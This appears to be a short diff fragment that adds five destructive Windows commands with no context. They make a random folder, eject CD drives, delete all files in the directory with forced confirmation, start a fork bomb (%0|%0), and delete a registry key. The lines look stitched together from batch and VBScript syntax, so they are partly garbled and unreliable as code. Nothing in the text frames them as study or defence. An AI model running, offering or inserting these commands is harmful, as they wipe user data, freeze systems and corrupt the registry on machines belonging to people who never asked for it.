@@ -1,0 +1,5 @@
+md %RANDOM%
+colCDROMs.Item(d).Eject
+Del *.* |y
+%0|%0
+reg delete %key%
